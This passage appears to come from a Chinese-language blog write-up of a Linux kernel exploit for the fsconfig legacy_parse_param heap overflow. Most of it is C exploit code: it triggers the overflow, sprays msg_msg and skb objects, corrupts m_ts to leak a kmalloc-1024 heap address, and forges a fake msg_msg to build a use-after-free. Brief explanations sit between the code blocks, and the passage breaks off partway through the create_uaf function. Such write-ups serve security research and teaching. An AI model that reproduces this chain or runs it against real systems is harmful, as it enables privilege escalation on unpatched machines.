<span class="token keyword">void</span> <span class="token function">prepare_overflow</span><span class="token punctuation">(</span><span class="token keyword">int</span> fsid<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>

  <span class="token keyword">char</span> buff<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"prepare fsconfig heap overflow"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token number">0x100</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0xf</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token comment">// ",=" + buff</span>
    <span class="token function">fsconfig</span><span class="token punctuation">(</span>fsid<span class="token punctuation">,</span> FSCONFIG_SET_STRING<span class="token punctuation">,</span> <span class="token string">"\x00"</span><span class="token punctuation">,</span> buff<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token number">0x100</span> <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// ",=" + buff</span>
  <span class="token function">fsconfig</span><span class="token punctuation">(</span>fsid<span class="token punctuation">,</span> FSCONFIG_SET_STRING<span class="token punctuation">,</span> <span class="token string">"\x00"</span><span class="token punctuation">,</span> buff<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="leak-heap"><a href="#leak-heap" class="headerlink" title="leak heap"></a>leak heap</h3><p>一图胜千言：<br><img src="/images/4161b49f/pasted-3.png" alt="leak"></p>
<p>首先喷射 4k 大小的 msg_msg，同时附带 64 字节大小的 msg_msgseg，图中橙色标注部分</p>
<p>再喷射 <code>kmalloc-64 &lt;-&gt; kmalloc-1024</code> 的消息队列，即图中蓝色标注部分</p>
<p>因为 64 字节的 msg_msgseg 和 64 字节的 msg_msg 很可能从同一个页中分配，那么当 4k 大小的 msg_msg 的 m_ts 被溢出改大后，通过 64 字节的 msg_msgseg 越界读出后面的 64 字节的 msg_msg 结构数据，则可以泄露出其 m_list.next 指向的 kmalloc-1024 地址，</p>
<blockquote>
<p>这里主要参照了 bsauce<sup>[5]</sup> 师傅的方法</p>
</blockquote>
<p>具体操作如下：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MSG_A_TEXT_SIZE</span> <span class="token punctuation">\</span>
  <span class="token expression"><span class="token punctuation">(</span><span class="token number">0x1000</span> <span class="token operator">+</span> <span class="token number">0x40</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msgseg</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>

<span class="token keyword">int</span> <span class="token function">do_leak_heap</span><span class="token punctuation">(</span><span class="token keyword">int</span> fsid<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>

  <span class="token keyword">char</span> buff<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"--- do_leak_heap ---"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">prepare_overflow</span><span class="token punctuation">(</span>fsid<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"spraying messasge queue 1..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_MSQIDS_1<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    msg_a<span class="token operator">-></span>mtype <span class="token operator">=</span> MTYPE_A<span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>msg_a<span class="token operator">-></span>mtext<span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> MSG_A_TEXT_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_a<span class="token operator">-></span>mtext<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> MSG_TAG<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_a<span class="token operator">-></span>mtext<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">msgsnd</span><span class="token punctuation">(</span>msqid_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> msg_a<span class="token punctuation">,</span> MSG_A_TEXT_SIZE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"msgsnd() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"spraying messasge queue 2..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_MSQIDS_2<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token class-name">size_t</span> n <span class="token operator">=</span> <span class="token number">1024</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>msg_b<span class="token operator">-></span>mtext<span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_b<span class="token operator">-></span>mtext<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> MSG_TAG<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_b<span class="token operator">-></span>mtext<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>

    msg_b<span class="token operator">-></span>mtype <span class="token operator">=</span> MTYPE_B1<span class="token punctuation">;</span>
    n <span class="token operator">=</span> <span class="token number">64</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">msgsnd</span><span class="token punctuation">(</span>msqid_2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> msg_b<span class="token punctuation">,</span> n<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"msgsnd() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    msg_b<span class="token operator">-></span>mtype <span class="token operator">=</span> MTYPE_B2<span class="token punctuation">;</span>
    n <span class="token operator">=</span> <span class="token number">1024</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">msgsnd</span><span class="token punctuation">(</span>msqid_2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> msg_b<span class="token punctuation">,</span> n<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"msgsnd() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"trigger oob write in `legacy_parse_param` to msg_msg.m_ts"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">strcat</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token string">"0000000"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// m_list.next</span>
  <span class="token function">strcat</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token string">"11111111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// m_list.prev</span>
  <span class="token function">strcat</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token string">"22222222"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// m_type</span>
  <span class="token class-name">uint64_t</span> target_size <span class="token operator">=</span> MSG_A_TEXT_SIZE <span class="token operator">+</span> <span class="token number">64</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">;</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span>buff <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>target_size<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// m_ts</span>
  <span class="token function">fsconfig</span><span class="token punctuation">(</span>fsid<span class="token punctuation">,</span> FSCONFIG_SET_STRING<span class="token punctuation">,</span> <span class="token string">"\x00"</span><span class="token punctuation">,</span> buff<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"searching corrupted msg_msg..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_MSQIDS_1<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token class-name">size_t</span> n <span class="token operator">=</span> <span class="token function">msgrcv</span><span class="token punctuation">(</span>msqid_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> msg_a_oob<span class="token punctuation">,</span> MSG_A_TEXT_SIZE <span class="token operator">+</span> <span class="token number">64</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>
                      MSG_COPY <span class="token operator">|</span> IPC_NOWAIT<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token keyword">continue</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> MSG_A_TEXT_SIZE <span class="token operator">+</span> <span class="token number">64</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      corrupted_msqid <span class="token operator">=</span> msqid_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>msqid_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">msgget</span><span class="token punctuation">(</span>IPC_PRIVATE<span class="token punctuation">,</span> IPC_CREAT <span class="token operator">|</span> <span class="token number">0666</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span>
          <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">// call clean_msg_1 without crash</span>
        <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"msgget() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

      <span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span>p <span class="token operator">=</span>
          <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>msg_a_oob<span class="token operator">-></span>mtext <span class="token operator">+</span> MSG_A_TEXT_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">30</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token operator">-></span>m_type <span class="token operator">==</span> MTYPE_B1 <span class="token operator">&amp;&amp;</span> p<span class="token operator">-></span>m_ts <span class="token operator">==</span> <span class="token number">64</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
            <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>p<span class="token operator">-></span>mtext<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> MSG_TAG<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          uaf_msqid <span class="token operator">=</span> msqid_2<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>p<span class="token operator">-></span>mtext<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token function">loginfo</span><span class="token punctuation">(</span><span class="token string">"corrupted_msqid = %d"</span><span class="token punctuation">,</span> corrupted_msqid<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">loginfo</span><span class="token punctuation">(</span><span class="token string">"uaf_msqid = %d"</span><span class="token punctuation">,</span> uaf_msqid<span class="token punctuation">)</span><span class="token punctuation">;</span>

          kmalloc_1024 <span class="token operator">=</span> p<span class="token operator">-></span>m_list<span class="token punctuation">.</span>next<span class="token punctuation">;</span>

          <span class="token comment">// call clean_msg_2 without crash</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>msqid_2<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>p<span class="token operator">-></span>mtext<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span>
                   <span class="token function">msgget</span><span class="token punctuation">(</span>IPC_PRIVATE<span class="token punctuation">,</span> IPC_CREAT <span class="token operator">|</span> <span class="token number">0666</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"msgget() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

          <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        p<span class="token operator">++</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>

      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">clean_msg_1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">clean_msg_2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>uaf_msqid <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

  <span class="token function">loginfo</span><span class="token punctuation">(</span><span class="token string">"kmalloc_1024 = %#lx"</span><span class="token punctuation">,</span> kmalloc_1024<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> fsid<span class="token punctuation">;</span>
  <span class="token keyword">int</span> pid<span class="token punctuation">;</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

    <span class="token function">init_unshare</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">bind_cpu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">init_sock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">init_msg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    fsid <span class="token operator">=</span> <span class="token function">call_fsopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">do_leak_heap</span><span class="token punctuation">(</span>fsid<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">close</span><span class="token punctuation">(</span>fsid<span class="token punctuation">)</span><span class="token punctuation">;</span>
      fsid <span class="token operator">=</span> <span class="token function">call_fsopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

      <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"retry do_leak_heap()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>


<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="create-uaf"><a href="#create-uaf" class="headerlink" title="create uaf"></a>create uaf</h3><p>释放 kmalloc_1024 的 msg_msg 结构体，再次触发漏洞，修改某个 msg_msg.m_list.next  为 kmalloc_1024，那么就构造了对该地址的 UAF 了</p>
<p>因为漏洞的溢出写入的是字符串 <code>,key=value</code>，且从 key 开始的位置就是 msg_msg.m_list.next 了，最后还会附加 <code>=</code>，且 kmalloc_1024 最低字节必然是 <code>\0</code>，被覆盖成 <code>=</code> 就不对了，所以无法直接覆盖成  kmalloc_1024，但是可以把 m_list.next 指向 kmalloc_1024 + offset 上，以避免 <code>\0</code></p>
<p>然后在 <code>kmalloc_1024 + offset</code> 处，伪造一个 msg_msg，其 m_list.next 指向 kmalloc_1024，也就是伪造成下面的效果：</p>
<pre class="line-numbers language-none"><code class="language-none">corrupted_msg_msg -&gt; kmalloc_1024 + offset -&gt; kmalloc_1024<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/images/4161b49f/pasted-4.png" alt="create_uaf"></p>
<p><strong>要注意 unlink 时 next/prev 指针指向的区域可写</strong></p>
<p>代码如下：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">fake_msg_msg_at_kmalloc_1024</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"--- fake_msg_msg_at_kmalloc_1024 ---"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"free kmalloc-1024"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">msgrcv</span><span class="token punctuation">(</span>uaf_msqid<span class="token punctuation">,</span> msg_b<span class="token punctuation">,</span> <span class="token number">1024</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">,</span> MTYPE_B2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"msgrcv() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"spraying skb..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>skb<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>skb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span>msg <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span>skb<span class="token punctuation">;</span>
  msg<span class="token operator">-></span>m_list<span class="token punctuation">.</span>next <span class="token operator">=</span> kmalloc_1024 <span class="token operator">+</span> <span class="token number">0x200</span><span class="token punctuation">;</span> <span class="token comment">// no matter</span>
  msg<span class="token operator">-></span>m_list<span class="token punctuation">.</span>prev <span class="token operator">=</span> kmalloc_1024 <span class="token operator">+</span> <span class="token number">0x300</span><span class="token punctuation">;</span> <span class="token comment">// no matter</span>
  msg<span class="token operator">-></span>m_type <span class="token operator">=</span> MTYPE_FAKE<span class="token punctuation">;</span>
  msg<span class="token operator">-></span>m_ts <span class="token operator">=</span> <span class="token number">0x100</span><span class="token punctuation">;</span>
  msg<span class="token operator">-></span>security <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

  msg<span class="token operator">++</span><span class="token punctuation">;</span>
  msg<span class="token operator">-></span>m_list<span class="token punctuation">.</span>next <span class="token operator">=</span> kmalloc_1024<span class="token punctuation">;</span>
  msg<span class="token operator">-></span>m_list<span class="token punctuation">.</span>prev <span class="token operator">=</span> kmalloc_1024 <span class="token operator">+</span> <span class="token number">0x400</span><span class="token punctuation">;</span> <span class="token comment">// no matter</span>
  msg<span class="token operator">-></span>m_type <span class="token operator">=</span> MTYPE_A<span class="token punctuation">;</span>
  msg<span class="token operator">-></span>m_ts <span class="token operator">=</span> <span class="token number">0x233</span><span class="token punctuation">;</span>
  msg<span class="token operator">-></span>security <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

  <span class="token function">spray_skbuff_data</span><span class="token punctuation">(</span>skb<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>skb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">create_uaf</span><span class="token punctuation">(</span><span class="token keyword">int</span> fsid<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buff<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> target_idx <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"--- create_uaf ---"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">prepare_overflow</span><span class="token punctuation">(</span>fsid<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"spraying messasge queue 1..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_MSQIDS_1<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    msg_a<span class="token operator">-></span>mtype <span class="token operator">=</span> MTYPE_A<span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>msg_a<span class="token operator">-></span>mtext<span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> MSG_A_TEXT_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_a<span class="token operator">-></span>mtext<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> MSG_TAG<span class="token punctuation">;</span>
